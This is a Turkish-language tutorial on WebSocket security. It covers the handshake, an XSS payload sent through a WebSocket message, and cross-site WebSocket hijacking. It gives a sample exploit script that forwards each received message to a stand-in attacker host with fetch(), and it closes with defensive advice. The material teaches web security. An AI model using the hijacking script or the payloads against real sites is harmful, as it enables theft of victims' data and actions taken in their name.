# WebSockets 
WebSockets HTTP üzerinden başlatılan çift yönlü  bir iletişim protokolüdür. Web uygulamalarında genellikle veri akışı ve diğer asenkron trafik türleri için kullanılır.

# HTTP ve WebSockets Arasındaki Fark
HTTP’de istemci bir request gönderir ve sunucu bir response döner. Genellikle yanıt anında gelir ve işlem tamamlanır. Ağ bağlantısı açık kalsa bile bu bağlantı yeni bir istek–yanıt işlemi için kullanılır. WebSocket bağlantıları HTTP üzerinden başlatılır. Mesajlar, herhangi bir yönde herhangi bir zamanda gönderilebilir ve bunlar HTTP’de olduğu gibi işlemsel değildir. Bağlantı normalde açık ve beklemede kalır; istemci veya sunucu mesaj göndermeye hazır olduğunda kullanılır.

# WebSocket Bağlantıları Nasıl Kurulur
WebSocket bağlantıları genellikle istemci tarafında JavaScript ile şu şekilde oluşturulur:
```js
var ws = new WebSocket("wss://normal-website.com/chat");
```

Bağlantı kurulurken, tarayıcı ile sunucu arasında HTTP üzerinden bir WebSocket handshake işlemi gerçekleşir. Tarayıcı şu şekilde bir WebSocket handshake isteği gönderir:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

Sunucu bağlantıyı kabul ederse şu şekilde bir yanıt döner:
```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

Bu noktadan sonra ağ bağlantısı açık kalır ve her iki yönde de WebSocket mesajları gönderilebilir. Bir WebSocket bağlantısı kurulduktan sonra, istemci veya sunucu tarafından asenkron şekilde mesaj gönderilebilir. Örneğin, tarayıcı tarafında basit bir mesaj şu şekilde gönderilebilir:
```
ws.send("Peter Wiener");
```

Prensipte, WebSocket mesajları herhangi bir içerik veya veri formatı içerebilir. Modern uygulamalarda genellikle yapılandırılmış verileri göndermek için JSON kullanılır. Standart HTTP ile ortaya çıkabilecek her web güvenliği açığı, WebSocket iletişiminde de ortaya çıkabilir.

# WebSocket Mesajlarını Manipüle Ederek Açıkları Sömürmek
Örneğin:
```
{"message":"Hello Carlos"}
```

Bu içerik daha sonra şöyle render edilir:
```
<td>Hello Carlos</td>
```

Bu durumda, herhangi bir ek filtreleme veya koruma yoksa, saldırgan şu mesajı göndererek XSS  gerçekleştirebilir:
```
{"message":"<img src=1 onerror='alert(1)'>"}
```

## Zafiyetleri Sömürmek İçin WebSocket Handshake Manipülasyonu
Bazı WebSocket güvenlik açıkları yalnızca WebSocket handshake manipüle edilerek bulunabilir ve sömürülebilir. Örneğin:
- HTTP header’larına  güvenilmesi Güvenlik kararlarını almak için X-Forwarded-For gibi header’ların kullanılması.
- Oturum yönetimindeki zafiyetler  WebSocket mesajlarının işlendiği oturum bağlamı , genellikle handshake mesajındaki oturum bağlamına göre belirlenir.

## Zafiyetleri Sömürmek İçin Cross-Site WebSockets Kullanımı
Bazı WebSocket güvenlik açıkları, saldırganın kendi kontrolündeki bir web sitesinden cross-domain WebSocket bağlantısı kurmasıyla ortaya çıkar. Buna cross-site WebSocket hijacking saldırısı denir ve genellikle WebSocket handshake üzerindeki bir CSRF (Cross-Site Request Forgery) açığından faydalanır. 

Örneğin, aşağıdaki WebSocket handshake isteği muhtemelen CSRF’ye karşı savunmasızdır, çünkü tek oturum token’ı cookie içinde iletilmektedir:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Handshake isteği CSRF’ye karşı savunmasızsa, saldırganın web sayfası çapraz bir istekle hedef sitede WebSocket açabilir. Saldırının bundan sonraki kısmı tamamen uygulamanın mantığına ve WebSocket’leri nasıl kullandığına bağlıdır. Saldırı şunları içerebilir:
- Kurban kullanıcı adına yetkisiz işlemler gerçekleştirmek için WebSocket mesajları göndermek.
- Hassas verileri elde etmek için WebSocket mesajları göndermek.

Örnek exploit:
```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

# WebSocket Bağlantısını Güvenli Hale Getirmek
WebSocket kullanırken güvenlik açıklarının ortaya çıkma riskini azaltmak için şu önerilere uyun:
- wss:// protokolünü kullanın (TLS üzerinden WebSocket).
- WebSocket handshake mesajını CSRF’ye karşı koruyun, böylece cross-site WebSocket hijacking açığını önlemiş olursunuz.
- WebSocket üzerinden alınan verileri her iki yönde de güvenilmez kabul edin. Hem sunucu hem de istemci tarafında verileri güvenli şekilde işleyin; böylece SQL injection veya XSS gibi girdi tabanlı açıkları önlersiniz.